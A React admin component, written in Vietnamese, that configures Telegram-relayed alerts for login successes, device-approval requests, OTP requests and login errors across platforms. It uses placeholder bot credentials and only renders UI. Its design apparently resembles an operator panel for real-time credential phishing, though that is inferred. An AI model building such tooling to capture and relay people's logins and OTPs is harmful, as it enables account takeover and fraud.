import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Textarea } from '../components/ui/textarea';
import { Switch } from '../components/ui/switch';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Badge } from '../components/ui/badge';
import { Settings, MessageSquare, Bell, Bot, Save, TestTube, Copy } from 'lucide-react';
import { useToast } from '../components/ui/use-toast';

const SystemConfiguration = ({ searchTerm }) => {
    const [telegramConfig, setTelegramConfig] = useState({
        botToken: 'bot123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ',
        chatId: '-1001234567890',
        enabled: true
    });

    const [notificationTemplates, setNotificationTemplates] = useState([
        {
            id: 1,
            name: 'Đăng nhập thành công',
            template: '✅ Đăng nhập thành công!\n👤 Tài khoản: {account}\n🌐 Platform: {platform}\n⏰ Thời gian: {time}',
            enabled: true
        },
        {
            id: 2,
            name: 'Yêu cầu phê duyệt',
            template: '⚠️ Yêu cầu phê duyệt thiết bị!\n👤 Tài khoản: {account}\n🌐 Platform: {platform}\n📱 Thiết bị: {device}\n⏰ Thời gian: {time}',
            enabled: true
        },
        {
            id: 3,
            name: 'Yêu cầu OTP',
            template: '🔐 Yêu cầu mã OTP!\n👤 Tài khoản: {account}\n🌐 Platform: {platform}\n📞 Số điện thoại: {phone}\n⏰ Thời gian: {time}',
            enabled: true
        },
        {
            id: 4,
            name: 'Lỗi đăng nhập',
            template: '❌ Lỗi đăng nhập!\n👤 Tài khoản: {account}\n🌐 Platform: {platform}\n🚫 Lỗi: {error}\n⏰ Thời gian: {time}',
            enabled: true
        }
    ]);

    const [alertSettings, setAlertSettings] = useState({
        userAccessAlert: true,
        loginFailureAlert: true,
        deviceApprovalAlert: true,
        otpRequestAlert: true,
        soundEnabled: true,
        desktopNotifications: true
    });

    const { toast } = useToast();

    const handleSaveConfig = () => {
        toast({
            title: 'Cấu hình đã lưu',
            description: 'Tất cả cài đặt hệ thống đã được lưu thành công.',
        });
    };

    const handleTestTelegram = () => {
        toast({
            title: 'Đang test Telegram Bot',
            description: 'Đang gửi tin nhắn test đến Telegram...',
        });
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        toast({
            title: 'Đã copy',
            description: 'Nội dung đã được copy vào clipboard.',
        });
    };

    return (
        <div className="space-y-6">
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="flex items-center justify-between"
            >
                <h1 className="text-3xl font-bold">Cấu Hình Hệ Thống</h1>
                <Button onClick={handleSaveConfig} className="bg-gradient-to-r from-blue-500 to-blue-600 text-white">
                    <Save className="mr-2 h-4 w-4" />
                    Lưu Cấu Hình
                </Button>
            </motion.div>

            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.1 }}
            >
                <Tabs defaultValue="notifications" className="w-full">
                    <TabsList className="grid w-full grid-cols-3">
                        <TabsTrigger value="notifications">Thông Báo</TabsTrigger>
                        <TabsTrigger value="alerts">Cài Đặt Chuông</TabsTrigger>
                        <TabsTrigger value="telegram">Telegram Bot</TabsTrigger>
                    </TabsList>

                    {/* Notification Templates Tab */}
                    <TabsContent value="notifications" className="space-y-4">
                        <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700 shadow-2xl">
                            <CardHeader>
                                <CardTitle className="flex items-center gap-2 text-xl font-bold text-white">
                                    <MessageSquare className="h-6 w-6 text-blue-400" />
                                    Mẫu Thông Báo
                                </CardTitle>
                            </CardHeader>
                            <CardContent className="space-y-4">
                                {notificationTemplates.map((template) => (
                                    <div key={template.id} className="p-4 border border-slate-600 rounded-lg bg-slate-800/50">
                                        <div className="flex items-center justify-between mb-3">
                                            <div className="flex items-center gap-3">
                                                <h3 className="text-lg font-semibold text-white">{template.name}</h3>
                                                <Badge variant={template.enabled ? 'default' : 'secondary'}>
                                                    {template.enabled ? 'Bật' : 'Tắt'}
                                                </Badge>
                                            </div>
                                            <div className="flex items-center gap-2">
                                                <Button
                                                    size="sm"
                                                    variant="ghost"
                                                    onClick={() => copyToClipboard(template.template)}
                                                    className="text-slate-400 hover:text-white"
                                                >
                                                    <Copy className="h-4 w-4" />
                                                </Button>
                                                <Switch
                                                    checked={template.enabled}
                                                    onCheckedChange={(checked) => {
                                                        setNotificationTemplates(prev =>
                                                            prev.map(t => t.id === template.id ? { ...t, enabled: checked } : t)
                                                        );
                                                    }}
                                                />
                                            </div>
                                        </div>
                                        <Textarea
                                            value={template.template}
                                            onChange={(e) => {
                                                setNotificationTemplates(prev =>
                                                    prev.map(t => t.id === template.id ? { ...t, template: e.target.value } : t)
                                                );
                                            }}
                                            className="bg-slate-700 border-slate-600 text-slate-200 font-mono text-sm"
                                            rows={4}
                                        />
                                        <div className="mt-2 text-xs text-slate-400">
                                            Biến có sẵn: {'{account}'}, {'{platform}'}, {'{time}'}, {'{device}'}, {'{phone}'}, {'{error}'}
                                        </div>
                                    </div>
                                ))}
                            </CardContent>
                        </Card>
                    </TabsContent>

                    {/* Alert Settings Tab */}
                    <TabsContent value="alerts" className="space-y-4">
                        <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700 shadow-2xl">
                            <CardHeader>
                                <CardTitle className="flex items-center gap-2 text-xl font-bold text-white">
                                    <Bell className="h-6 w-6 text-yellow-400" />
                                    Cài Đặt Chuông & Thông Báo
                                </CardTitle>
                            </CardHeader>
                            <CardContent className="space-y-6">
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                    <div className="space-y-4">
                                        <h3 className="text-lg font-semibold text-white">Cảnh Báo Hệ Thống</h3>
                                        
                                        <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                            <div>
                                                <Label className="text-slate-200 font-medium">Cảnh báo khi user truy cập</Label>
                                                <p className="text-sm text-slate-400">Thông báo khi có user mới truy cập web</p>
                                            </div>
                                            <Switch
                                                checked={alertSettings.userAccessAlert}
                                                onCheckedChange={(checked) => 
                                                    setAlertSettings(prev => ({ ...prev, userAccessAlert: checked }))
                                                }
                                            />
                                        </div>

                                        <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                            <div>
                                                <Label className="text-slate-200 font-medium">Cảnh báo lỗi đăng nhập</Label>
                                                <p className="text-sm text-slate-400">Thông báo khi đăng nhập thất bại</p>
                                            </div>
                                            <Switch
                                                checked={alertSettings.loginFailureAlert}
                                                onCheckedChange={(checked) => 
                                                    setAlertSettings(prev => ({ ...prev, loginFailureAlert: checked }))
                                                }
                                            />
                                        </div>

                                        <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                            <div>
                                                <Label className="text-slate-200 font-medium">Cảnh báo phê duyệt thiết bị</Label>
                                                <p className="text-sm text-slate-400">Thông báo khi cần phê duyệt thiết bị</p>
                                            </div>
                                            <Switch
                                                checked={alertSettings.deviceApprovalAlert}
                                                onCheckedChange={(checked) => 
                                                    setAlertSettings(prev => ({ ...prev, deviceApprovalAlert: checked }))
                                                }
                                            />
                                        </div>

                                        <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                            <div>
                                                <Label className="text-slate-200 font-medium">Cảnh báo yêu cầu OTP</Label>
                                                <p className="text-sm text-slate-400">Thông báo khi cần nhập mã OTP</p>
                                            </div>
                                            <Switch
                                                checked={alertSettings.otpRequestAlert}
                                                onCheckedChange={(checked) => 
                                                    setAlertSettings(prev => ({ ...prev, otpRequestAlert: checked }))
                                                }
                                            />
                                        </div>
                                    </div>

                                    <div className="space-y-4">
                                        <h3 className="text-lg font-semibold text-white">Cài Đặt Âm Thanh</h3>
                                        
                                        <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                            <div>
                                                <Label className="text-slate-200 font-medium">Âm thanh thông báo</Label>
                                                <p className="text-sm text-slate-400">Phát âm thanh khi có thông báo</p>
                                            </div>
                                            <Switch
                                                checked={alertSettings.soundEnabled}
                                                onCheckedChange={(checked) => 
                                                    setAlertSettings(prev => ({ ...prev, soundEnabled: checked }))
                                                }
                                            />
                                        </div>

                                        <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                            <div>
                                                <Label className="text-slate-200 font-medium">Thông báo desktop</Label>
                                                <p className="text-sm text-slate-400">Hiển thị thông báo trên desktop</p>
                                            </div>
                                            <Switch
                                                checked={alertSettings.desktopNotifications}
                                                onCheckedChange={(checked) => 
                                                    setAlertSettings(prev => ({ ...prev, desktopNotifications: checked }))
                                                }
                                            />
                                        </div>
                                    </div>
                                </div>
                            </CardContent>
                        </Card>
                    </TabsContent>

                    {/* Telegram Bot Tab */}
                    <TabsContent value="telegram" className="space-y-4">
                        <Card className="bg-gradient-to-br from-slate-900/90 to-slate-800/90 border-slate-700 shadow-2xl">
                            <CardHeader>
                                <CardTitle className="flex items-center gap-2 text-xl font-bold text-white">
                                    <Bot className="h-6 w-6 text-green-400" />
                                    Cấu Hình Telegram Bot
                                </CardTitle>
                            </CardHeader>
                            <CardContent className="space-y-6">
                                <div className="flex items-center justify-between p-3 bg-slate-800/50 rounded-lg">
                                    <div>
                                        <Label className="text-slate-200 font-medium">Kích hoạt Telegram Bot</Label>
                                        <p className="text-sm text-slate-400">Bật/tắt gửi thông báo qua Telegram</p>
                                    </div>
                                    <Switch
                                        checked={telegramConfig.enabled}
                                        onCheckedChange={(checked) => 
                                            setTelegramConfig(prev => ({ ...prev, enabled: checked }))
                                        }
                                    />
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                    <div className="space-y-4">
                                        <div>
                                            <Label className="text-slate-200 font-medium">Bot Token</Label>
                                            <div className="flex gap-2 mt-2">
                                                <Input
                                                    type="password"
                                                    value={telegramConfig.botToken}
                                                    onChange={(e) => setTelegramConfig(prev => ({ ...prev, botToken: e.target.value }))}
                                                    className="bg-slate-700 border-slate-600 text-slate-200 font-mono"
                                                    placeholder="bot123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                                />
                                                <Button
                                                    size="sm"
                                                    variant="ghost"
                                                    onClick={() => copyToClipboard(telegramConfig.botToken)}
                                                    className="text-slate-400 hover:text-white"
                                                >
                                                    <Copy className="h-4 w-4" />
                                                </Button>
                                            </div>
                                            <p className="text-xs text-slate-400 mt-1">
                                                Lấy token từ @BotFather trên Telegram
                                            </p>
                                        </div>

                                        <div>
                                            <Label className="text-slate-200 font-medium">Chat ID</Label>
                                            <div className="flex gap-2 mt-2">
                                                <Input
                                                    value={telegramConfig.chatId}
                                                    onChange={(e) => setTelegramConfig(prev => ({ ...prev, chatId: e.target.value }))}
                                                    className="bg-slate-700 border-slate-600 text-slate-200 font-mono"
                                                    placeholder="-1001234567890"
                                                />
                                                <Button
                                                    size="sm"
                                                    variant="ghost"
                                                    onClick={() => copyToClipboard(telegramConfig.chatId)}
                                                    className="text-slate-400 hover:text-white"
                                                >
                                                    <Copy className="h-4 w-4" />
                                                </Button>
                                            </div>
                                            <p className="text-xs text-slate-400 mt-1">
                                                ID của group/channel nhận thông báo
                                            </p>
                                        </div>
                                    </div>

                                    <div className="space-y-4">
                                        <div className="p-4 bg-slate-800/50 rounded-lg">
                                            <h4 className="text-sm font-medium text-slate-200 mb-2">Hướng dẫn thiết lập:</h4>
                                            <ol className="text-xs text-slate-400 space-y-1">
                                                <li>1. Tạo bot mới với @BotFather</li>
                                                <li>2. Copy Bot Token vào ô trên</li>
                                                <li>3. Thêm bot vào group/channel</li>
                                                <li>4. Lấy Chat ID của group/channel</li>
                                                <li>5. Test kết nối</li>
                                            </ol>
                                        </div>

                                        <Button
                                            onClick={handleTestTelegram}
                                            className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white"
                                            disabled={!telegramConfig.enabled}
                                        >
                                            <TestTube className="mr-2 h-4 w-4" />
                                            Test Telegram Bot
                                        </Button>
                                    </div>
                                </div>
                            </CardContent>
                        </Card>
                    </TabsContent>
                </Tabs>
            </motion.div>
        </div>
    );
};

export default SystemConfiguration;
